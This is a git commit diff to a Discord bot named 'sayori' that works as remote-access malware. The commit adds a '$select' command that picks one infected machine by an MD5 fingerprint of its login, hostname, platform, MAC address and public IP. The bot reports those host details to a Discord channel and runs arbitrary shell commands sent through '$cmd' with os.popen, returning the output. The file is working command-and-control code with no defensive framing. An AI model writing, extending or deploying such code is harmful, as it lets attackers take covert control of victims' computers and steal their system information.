35e3b409879aa526d6155653288de87589f4c7f1
Nanachi <n4n4ch1@proton.me>
2022-12-08 19:39:20 +0300

    Add select command

--- sayori/main.py
+++ sayori/main.py
@@ -5,11 +5,15 @@ import os
 import platform
 from uuid import getnode
 from requests import get
+import hashlib
 
 intents = discord.Intents.default()
 intents.message_content = True
 
 client = discord.Client(intents=intents)
+
+selected = False
+selinfo = hashlib.md5((os.getlogin() + platform.node() + platform.platform() + str(getnode()) + get('https://api.ipify.org').content.decode('utf8')).encode('utf-8')).hexdigest()
 
 @client.event
 async def on_ready():
@@ -32,21 +36,37 @@ async def on_message(message):
     if message.content.startswith('$list'):
         ip = get('https://api.ipify.org').content.decode('utf8')
         await message.channel.send(os.getlogin() + ' | ' + platform.node() + '\n```' + 
-                           'platform: ' + platform.platform() + '\n' +
-                           'MAC: ' + str(getnode()) + '\n' +
-                           'IP: ' + ip + '\n' +
-                           '```'
+            'platform: ' + platform.platform() + '\n' +
+            'MAC: ' + str(getnode()) + '\n' +
+            'IP: ' + ip + '\n' +
+            '```' +
+            selinfo + '\n' +
+            '-'*64
         )
 
-    if message.content.startswith('$cmd'):
+    if message.content.startswith('$select'):
         msg = message.content.split()
-        cmd = ''.join((msg[1:]))
-        out = os.popen(cmd).read()
-        if len(out) > 2000:
-            with open('message.txt', 'w') as f:
-                f.write(out)
-            await message.channel.send(file=discord.File('message.txt'))
+        indent = ''.join((msg[1]))
+        global selected
+        if selected == False:
+            if indent == selinfo:
+                selected = True
+                await message.channel.send(indent + ' selected')
+            else:
+                await message.channel.send(indent + ' not found')
         else:
-            await message.channel.send(out)
+            selected = False
+
+    if selected == True:
+        if message.content.startswith('$cmd'):
+            msg = message.content.split()
+            cmd = ''.join((msg[1:]))
+            out = os.popen(cmd).read()
+            if len(out) > 2000:
+                with open('message.txt', 'w') as f:
+                    f.write(out)
+                await message.channel.send(file=discord.File('message.txt'))
+            else:
+                await message.channel.send(out)
 
 client.run(settings.token)
